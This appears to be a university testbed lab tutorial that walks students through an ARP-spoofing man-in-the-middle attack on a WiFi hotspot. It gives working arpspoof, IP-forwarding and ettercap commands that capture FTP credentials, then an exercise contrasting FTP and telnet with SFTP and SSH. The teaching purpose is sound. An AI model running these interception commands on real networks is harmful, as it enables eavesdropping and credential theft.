This experiment shows how an attacker can use a simple man-in-the-middle attack to capture and view traffic that is transmitted through a WiFi hotspot.

It should take about 60-120 minutes to run this experiment, but you will need to have [reserved that time](http://geni.orbit-lab.org) in advance. This experiment uses wireless resources (specifically, the "outdoor" testbed on [ORBIT](http://geni.orbit-lab.org), or the [WITest](https://witestlab.poly.edu) testbed), and you can only use wireless resources on GENI during a reservation.

To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). The project lead of the project you belong to must have [enabled wireless for the project](https://portal.geni.net/secure/wimax-enable.php). Finally, you must have reserved time on either [the outdoor testbed at ORBIT](http://geni.orbit-lab.org) or the [WITest testbed](https://witestlab.poly.edu), and you must run this experiment during your reserved time. (Alternatively, you can use "sb4" testbed at [ORBIT](http://geni.orbit-lab.org), with some [modifications](#usingothertestbeds) to the instructions.)

* Skip to [Results](#results)
* Skip to [Run my experiment](#runmyexperiment)


## Background

This experiment shows how a malicious attacker can act as a "man in the middle" to capture traffic on a WiFi hotspot, including potentially sensitive material such as login credentials and private web browsing.

A [man in the middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (MITM) attack is one where the attacker (in our example, Mallory) secretly captures and relays communication between two parties who believe they are directly communicating with each other (in our example, Alice and Bob.)

![](/blog/content/images/2016/03/mitm-illustration.svg)


When data is sent over a WiFi network using WPA-PSK or WPA2-PSK security, it is encrypted at Layer 2 with per-client, per-session keys, and may be decrypted only by its destination. Other clients on the same access point can capture the traffic, but can't necessarily decrypt it - to decrypt the traffic, a malicious attacker would have had to either capture the initial handshake between client and AP (when the keys were set up), or force the client to disconnect and reconnect, and capture the new handshake between client and AP.

The attack we're going to try involves a different approach, using a technique known as [ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing) or ARP poisoning. In this experiment, Alice and Bob are connected to a WiFi hotspot, and wish to communicate with one another. Under normal circumstances, they will use [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies to find out the physical address (MAC address) to which to direct their traffic. 

In our experiment, however, the attacker (Mallory) will send gratuitous ARP messages to Alice, giving its own MAC address as the physical address for Bob; and similar ARP messages to Bob, giving its own MAC address as the physical address for Alice.

Then, when Alice and Bob communicate, they will unwittingly treat Mallory as the destination for all of their traffic, and send their entire communication through her. (Mallory will forward the traffic, so that neither side is aware that she is intercepting it.)

For example, suppose the four nodes have the following MAC addresses:

* AP: 00:15:6d:85:e0:c9                                             
* Bob: 00:15:6d:85:e0:c6                                           
* Alice: 00:15:6d:84:92:cd                                      
* Mallory: 0:60:b3:25:c0:37  

A packet from Alice to Bob will be transmitted over the air four times, with different addresses in the Layer 2 header each time. 

First, it will be sent with Alice's MAC address as the source and transmitter address, Mallory's MAC address as the destination address (since Alice believes this to be Bob's MAC address), and the AP's MAC address as the receiver address (since all traffic goes through the AP when operating in infrastructure mode): 

```
Receiver address: 00:15:6d:85:e0:c9
Destination address: 00:60:b3:25:c0:37
Transmitter address: 00:15:6d:84:92:cd
Source address: 00:15:6d:84:92:cd
```

Then the AP will forward the packet to Mallory, with its own MAC address as the transmitter address, Alice's MAC address as the source address, and Mallory's MAC address as the receiver address and the destination address:

```
Receiver address: 00:60:b3:25:c0:37
Destination address: 00:60:b3:25:c0:37
Transmitter address: 00:15:6d:85:e0:c9
Source address: 00:15:6d:84:92:cd
```

As far as the AP is aware (from the Layer 2 headers), Mallory is the final destination for this packet, so the AP will use Mallory's key to encrypt the packet and she will be able to decrypt it and see its contents.  

Then, Mallory will forward the packet to Bob. The next copy of this packet on the air will have Mallory's MAC address as the source and transmitter address, Bob's MAC address as the destination address, and the AP's MAC address as the receiver address:

```
Receiver address: 00:15:6d:85:e0:c9
Destination address: 00:15:6d:85:e0:c6
Transmitter address: 00:60:b3:25:c0:37
Source address: 00:60:b3:25:c0:37
```

Finally, the AP will retransmit the packet with Bob's MAC address as the receiver and destination address, Mallory's MAC address as the source address, and its own MAC address as the transmitter address:

```
Receiver address: 00:15:6d:85:e0:c6
Destination address: 00:15:6d:85:e0:c6
Transmitter address: 00:15:6d:85:e0:c9
Source address: 00:60:b3:25:c0:37
```

Thus, Mallory will be able to silently view (and potentially modify) all of their communication.

This single packet transmission is summarized in the following diagram:

![](/blog/content/images/2017/04/mitm-one-packet-1.svg)

(To learn more about the address fields in the 802.11 header, see the experiment [Understanding the 802.11 Wireless LAN MAC frame format](https://witestlab.poly.edu/blog/802-11-wireless-lan-2/).)

## Results

In our experiment, a malicious attacker is able intercept traffic between two hosts on a wireless network, and can then sniff login credentials used by one of the hosts.

After the attacker sends out spoofed ARP messages, each host believes that the other host has the _attacker_'s MAC address as its address.

Here, the host at 192.168.0.3 believes that the host at 192.168.0.4 has 00:0c:42:3a:c4:77 as its physical address:

<pre>
? (192.168.0.4) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
</pre>

and the host at 192.168.0.4 believes that the host at 192.168.0.3 has 00:0c:42:3a:c4:77 as its physical address:


<pre>
? (192.168.0.3) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
</pre>

but actually, 00:0c:42:3a:c4:77 is the MAC address belonging to the malicious attacker (at 192.168.0.5):

<pre>
root@node1-5:~# ifconfig wlan0
wlan0     Link encap:Ethernet  HWaddr <b>00:0c:42:3a:c4:77</b>  
          inet addr:192.168.0.5  Bcast:192.168.0.255  Mask:255.255.255.0
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:48 errors:0 dropped:0 overruns:0 frame:0
          TX packets:384 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3949 (3.9 KB)  TX bytes:24803 (24.8 KB)
</pre>

When one of the hosts logs in to the other using FTP, the malicious attacker can capture the login credentials:


```
FTP : 192.168.0.4:21 -> USER: alice  PASS: SeCrEtPaSsWoRd
```

Here's a video of the experiment, including the setup. Note that the title bar for each terminal pane indicates which role it plays, e.g. Mallory (the malicious attacker), Alice (the host whose FTP sessions are compromised), or Bob (the FTP server at which Alice's credentials are compromised):

<iframe width="560" height="315" src="https://www.youtube.com/embed/GVu91EISH_M" frameborder="0" allowfullscreen></iframe>

## Run my experiment

To run this experiment, you must have a current reservation on the "outdoor" testbed at [ORBIT](https://geni.orbit-lab.org) or on the [WITest](https://witestlab.poly.edu) testbed. You can also use the "sb4" testbed at [ORBIT](https://geni.orbit-lab.org), with some [modifications](#usingothertestbeds) to the instructions.

At your reserved time, SSH to your testbed console (e.g. "witestlab.poly.edu" for WITest, "outdoor.orbit-lab.org" for outdoor on ORBIT, or "sb4.orbit-lab.org" for sb4 on ORBIT) with your GENI keys and using your GENI wireless username. (Your GENI wireless username is typically your GENI username, prefixed by "geni-", e.g. mine is "geni-ffund01".)

For this experiment, we will need a group of four neighboring nodes that are available and have an Atheros 9xxx wireless card. In the instructions that follow, we use either node22, node23, node18, and node19 on the WITest testbed; or node1-2, node1-3, node1-4, and node1-5 on the ORBIT outdoor testbed. If any of these are not available, you can substitute other Atheros 9xxx-equipped nodes that are available.

### Prepare the testbed

> **If you are using sb4**: Follow the  [modified instructions](#usingothertestbeds) to set up the testbed. Then, resume with the regular instructions from [Open SSH sessions](#opensshsessions).


Next, load the `wifi-experiment.ndz` disk image onto all the nodes in your group. For example, if you are on WITest and using node22, node23, node18, and node19, run:

<pre>
omf-5.4 load -i wifi-experiment.ndz -t omf.witest.node22,omf.witest.node23,omf.witest.node18,omf.witest.node19
</pre>

(note that there are no spaces in between the commas and the nodes names in the command above). Alternatively, if you are on outdoor and using node1-2, node1-3, node1-4, and node1-5, run:

<pre>
omf-5.4 load -i wifi-experiment.ndz -t node1-2.outdoor.orbit-lab.org,node1-3.outdoor.orbit-lab.org,node1-4.outdoor.orbit-lab.org,node1-5.outdoor.orbit-lab.org
</pre>

When the image has been loaded onto the nodes, turn them on. For example, if using those four nodes on WITest, run 

<pre>
omf tell -a on -t omf.witest.node22,omf.witest.node23,omf.witest.node18,omf.witest.node19
</pre>

whereas if using the four nodes on outdoor, you would run

<pre>
omf tell -a on -t node1-2.outdoor.orbit-lab.org,node1-3.outdoor.orbit-lab.org,node1-4.outdoor.orbit-lab.org,node1-5.outdoor.orbit-lab.org
</pre>

### Open SSH sessions


Wait a few minutes for your nodes to boot. Then, open _six_ terminal windows and SSH to your testbed console ("witestlab.poly.edu" or "outdoor.orbit-lab.org") in each one.

Of the four nodes in your group, designate one node as the access point (AP), one node as Alice, one node as Bob, and one node as Mallory. In this experiment, Mallory will attempt to intercept communications between Alice and Bob, capturing sensitive information such as FTP login credentials.

> **Important note**: if you are using the outdoor testbed on ORBIT, due to the physical layout of nodes it is recommended to use node1-4 as the AP. In other configurations (using a different node as the AP), the other nodes may not all be in range of the AP.

* In one of your SSH terminals, SSH to the node that you have designated as the AP, as the "root" user.
* In one of your SSH terminals, SSH to the node that you have designated as Bob, as the "root" user.
* In one of your SSH terminals, SSH to the node that you have designated as Alice, as the "root" user.
* In the other three of your SSH terminals, SSH to the node that you have designated as Mallory, as the "root" user.

### Configure Bob as an FTP server

Bob is going to provide an FTP server. Alice will log in to this FTP server, so she will need an account. 

Create an account for Alice so she can log in to Bob's FTP server. On Bob, run

```
useradd -m alice -s /bin/sh
passwd alice
```

and enter a password for "alice" when prompted. (No characters will appear as you type.)

### Start the AP

On the node designated as the access point, start the wireless network with

```
ifconfig wlan0 up
create_ap -n wlan0 mitm SECRETPASSWORD
```

where "SECRETPASSWORD" is the passphrase. This will create an AP with ESSID "mitm" (for "Man-in-the-Middle").

### Connect to the access point

Now that the AP is up, Alice, Bob, and Mallory are ready to connect to it. On *each* of those three nodes, run

```
ifconfig wlan0 up
```

to bring up the wireless interface. Then, run

```
iwlist wlan0 scan
```

and make sure you can see the network with "mitm" ESSID.

Then, create a WiFi config file with

<pre>
wpa_passphrase mitm SECRETPASSWORD > wpa.conf
</pre>

where "SECRETPASSWORD" is its passphrase.

Connect to the network with

<pre>
wpa_supplicant -iwlan0 -cwpa.conf -B
</pre>


> _**Note**: the WPA supplicant utility will remain running as a background process, and will attempt to reconnect if the client is disconnected from the network. Be careful not to run it more than once - if you have two supplicants running at the same time, they will conflict and cause connectivity issues._

Use 

```
iwconfig wlan0
```

to verify that you are connected.

Finally, set an IP address on each node. On Alice:

```
ifconfig wlan0 192.168.0.3
```

On Bob:

```
ifconfig wlan0 192.168.0.4
```

and on Mallory: 

```
ifconfig wlan0 192.168.0.5
```

Also use

```
ifconfig wlan0
```

and make a note of each node's MAC address.

Make sure all the nodes can ping one another by IP address. On each, run:

```
ping -c 1 192.168.0.3
ping -c 1 192.168.0.4
ping -c 1 192.168.0.5
```



### Carry out the attack

Now that everyone is on the network, Mallory is ready to carry out her attack. For this attack, she will send gratuitous ARP messages, making Alice think that Mallory's MAC address is the Layer 2 address for Bob's IP address, and making Bob think that Mallory's MAC address is the Layer 2 address for Alice's IP address.

To start the ARP spoofing, Mallory will run

<pre>
arpspoof -i wlan0 -t 192.168.0.3 192.168.0.4
</pre>

in one terminal and 

<pre>
arpspoof -i wlan0 -t 192.168.0.4 192.168.0.3 
</pre>

in another.

Here, Mallory sends ARP messages to Alice (192.168.0.3) that make Alice believe that Bob (192.168.0.4) is located at Mallory's MAC access. Mallory also sends ARP messages to Bob to that make Bob believe that Alice is located at Mallory's MAC address.

You should see output on the terminal indicating that Mallory is sending gratuitous ARPs. For example:

<pre>
0:c:42:3a:c4:77 0:c:42:3a:b4:8 0806 42: <b>arp reply 192.168.0.3 is-at 0:c:42:3a:c4:77</b>
</pre>

These ARP replies will continue to appear at regular intervals.

Also, if Alice runs

```
arp -na
```

we can see that Alice believes that Bob is at Mallory's MAC address, e.g.:

<pre>
? (192.168.0.4) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
</pre>

and if we run

```
arp -na
```

on Bob, we'll see that he believes _Alice_ is at Mallory's MAC address, e.g.:

<pre>
? (192.168.0.3) at <b>00:0c:42:3a:c4:77</b> [ether] on wlan0
</pre>

Since the ARP poisoning has been successful, Mallory will now receive traffic destined for  Alice and Bob, and can look at it or modify it before passing it on to its intended destination. 

Mallory also needs to enable packet forwarding, so that Alice and Bob's traffic will be forwarded to each other through her and they won't notice any disruption. In the third Mallory terminal, run

```
sysctl -w net.ipv4.ip_forward=1
```

to enable packet forwarding. 

Then, start the [Ettercap](https://ettercap.github.io/ettercap/) packet interceptor/sniffer:

```
ettercap -T -i wlan0
```

Any interesting traffic passing between Alice and Bob (passing through Mallory) will appear in the Ettercap output. 

Alice is ready to start an FTP session, in which she connects to Bob. On Alice, run


```
ftp
``` 

and then at the FTP prompt, open a connection to Bob with

```
open 192.168.0.4
```

to connect to Bob.

When prompted, give your name ("alice") and the password you set when you previously ran "passwd alice" on Bob.

Alice should see a successful connection to Bob, and has no idea that the connection was intercepted by Mallory. In fact, if you check the "ettercap" window on Mallory, you should see a line like

```
FTP : 192.168.0.4:21 -> USER: alice  PASS: SeCrEtPaSsWoRd
```

in the output, i.e. Mallory has found out Alice's username and password for logging in to Bob.

Mallory can then open an FTP or SSH connection to Bob using Alice's credentials.

## Notes

### Exercise

This experiment highlights the danger of sending data "in the clear" (i.e. unencrypted) over an insecure medium. In this example, the attacker was even able to work around the per-client, per-session encryption keys at Layer 2 to capture sensitive data!

Using encryption at the application layer makes it much more difficult for a malicious attacker on the wireless channel to capture credentials sent over an insecure medium.

To see how this works, try using SFTP - secure FTP - in place of FTP. Leave Ettercap (and the ARP spoofing) running on the Mallory node, and on Alice, run

```
sftp alice@192.168.0.4
```

to connect to Bob using secure FTP. When prompted, log in with the password you set for "alice". 

Look at what appears in the Ettercap window. Are Alice's credentials visible to Mallory?


Similarly, compare telnet and SSH, two applications used for remote login.  On Bob, install telnet with

```
apt-get update
apt-get -y install xinetd telnetd
```

Then, still on Bob, create the telnet configuration file with

```
nano /etc/xinetd.d/telnet
```

Paste the following into the file:

```
# default: on
# description: telnet server
service telnet
{
disable = no
flags = REUSE
socket_type = stream
wait = no
user = root
server = /usr/sbin/in.telnetd
log_on_failure += USERID
}
```

Then hit Ctrl+O and Enter to save the file, and Ctrl+X to exit nano. Finally, restart the service on Bob with

```
service xinetd restart
```

Make sure Ettercap and both ARP spoofing processes are still running on Mallory. To attempt a telnet login, on Alice run

```
telnet 192.168.0.4
```

then, when prompted, give your username (alice) and password that you set up earlier.  Look at the Ettercap window - are Alice's credentials captured?

Repeat the remote login with SSH. On Alice, run

```
ssh alice@192.168.0.4
```

and, when prompted, give Alice's password. Look at the Ettercap window - are Alice's credentials captured?

In your submission,

* Show what is captured by Ettercap when Alice uses each of the four applications: FTP, SFTP, telnet, and SSH. (Make sure to indicate which output came from which application.) In the output, **<font 
style="background-color: yellow">highlight</font>** Alice's username and password wherever they appear. (Note that they may appear one or two letters at a time, in separate packets, or all together in one packet.)
* For _each_ of the four applications, use your experiment results to explain whether credentials sent using this application can be captured by a malicious user when using an insecure medium (like a public WiFi hotspot, or an unsecured WiFi network with no password). 
* Based on the results of this experiment: Which file transfer application - FTP or SFTP - is more secure? Which remote login application - telnet or SSH - is more secure? Explain why.

### Using other testbeds

This experiment will also work on the "sb4" testbed at ORBIT, which currently has four Atheros 9xxx-equipped nodes: node1-3, node1-4, node1-5, and node1-6. If using "sb4", when you first log in to the "sb4" console you should run

<pre>
wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/setAll?att=0"

wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/setAll?att=0"

wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/selDevice?switch=3&port=1"  
wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/selDevice?switch=4&port=1"
wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/selDevice?switch=5&port=1"  
wget -qO- "http://internal2dmz.orbit-lab.org:5054/instr/selDevice?switch=6&port=1"
</pre>

to [reset sb4's programmable attenuation matrix](http://www.orbit-lab.org/wiki/Hardware/bDomains/cSandboxes/dSB4) to zero attenuation between all pairs of nodes, and configure the WiFi NICs of these four nodes to be visible to one another.

Then you can run

<pre>
omf-5.4 load -i wifi-experiment.ndz -t node1-3.sb4.orbit-lab.org,node1-4.sb4.orbit-lab.org,node1-5.sb4.orbit-lab.org,node1-6.sb4.orbit-lab.org
</pre>

and when the disk image has finished loading, run


<pre>
omf tell -a on -t node1-3.sb4.orbit-lab.org,node1-4.sb4.orbit-lab.org,node1-5.sb4.orbit-lab.org,node1-6.sb4.orbit-lab.org
</pre>

Then, resume with the regular instructions from [Open SSH sessions](#opensshsessions).

---

You can also run this experiment on any group of four adjacent Atheros 9XXX-equipped nodes on the "grid" testbed at ORBIT. The "grid" testbed is generally in high demand, however.

To use another wireless testbed besides for ORBIT or WITest, you may need to install some software or do some other configuration steps that are already prepared on the `wifi-experiment.ndz` disk image on ORBIT/WITest.

To create the `wifi-experiment.ndz` disk image, I started from a baseline Ubuntu 14.04 disk image. Then I installed some software from the Ubuntu package repositories: 


```
apt-get update
apt-get -y install git hostapd iproute2 dnsmasq iptables haveged aircrack-ng dsniff ettercap-text-only vsftpd
```
I installed the [create\_ap](https://github.com/oblique/create_ap.git) tool, which makes it easy to set up a device as a WiFi access point:

```
git clone https://github.com/oblique/create_ap.git
cd create_ap
make install
```
I also un-blacklisted the `ath9k` driver, i.e.

```
rm /etc/modprobe.d/blacklist-ath9k.conf
```

so that the `ath9k` module is loaded at boot. Alternatively, you can manually load the module on each boot with

```
modprobe ath9k
```
